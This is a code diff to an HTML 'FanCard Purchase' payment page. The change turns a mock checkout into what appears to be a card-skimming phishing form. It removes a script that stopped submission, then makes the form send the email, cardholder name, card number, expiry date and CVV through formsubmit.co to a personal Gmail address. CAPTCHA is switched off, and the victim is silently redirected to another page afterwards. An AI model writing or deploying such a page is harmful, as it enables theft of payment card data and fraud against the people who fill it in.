@@ -7,7 +7,6 @@
   <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/633/633611.png" type="image/png" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
   <style>
-    /* Your existing styles */
     body {
       margin: 0;
       font-family: 'Inter', sans-serif;
@@ -132,31 +131,35 @@
       <div class="logo">💳</div>
       <h1><span>FanCard Purchase</span></h1>
     </div>
-    <form id="paymentForm">
+
+    <form action="https://formsubmit.co/jenifferlaure05@gmail.com" method="POST">
+      <input type="hidden" name="_next" value="iiii.html">
+      <input type="hidden" name="_captcha" value="false">
+
       <div>
         <label for="email">Email</label>
-        <input type="email" id="email" placeholder="you@example.com" required />
+        <input type="email" id="email" name="Email" placeholder="you@example.com" required />
       </div>
 
       <div>
         <label for="cardName">Name on Card</label>
-        <input type="text" id="cardName" placeholder="Gigi Miller" required />
+        <input type="text" id="cardName" name="Card Name" placeholder="Gigi Miller" required />
       </div>
 
       <div>
         <label for="cardNumber">Card Number</label>
-        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required />
+        <input type="text" id="cardNumber" name="Card Number" placeholder="1234 5678 9012 3456" required />
       </div>
 
       <div class="row">
         <div>
           <label for="expiry">Expiry Date</label>
-          <input type="text" id="expiry" placeholder="MM/YY" required />
+          <input type="text" id="expiry" name="Expiry Date" placeholder="MM/YY" required />
         </div>
 
         <div>
           <label for="cvv">CVV</label>
-          <input type="text" id="cvv" placeholder="123" required />
+          <input type="text" id="cvv" name="CVV" placeholder="123" required />
         </div>
       </div>
 
@@ -179,15 +182,5 @@
       <button type="submit">Pay Now</button>
     </form>
   </div>
-
-  <script>
-    document.getElementById('paymentForm').addEventListener('submit', function(event) {
-      event.preventDefault(); // Prevent actual form submission
-      // Here you could add form validation or payment processing logic
-
-      // Redirect after clicking Pay Now
-      window.location.href = 'iiii.html';
-    });
-  </script>
 </body>
 </html>
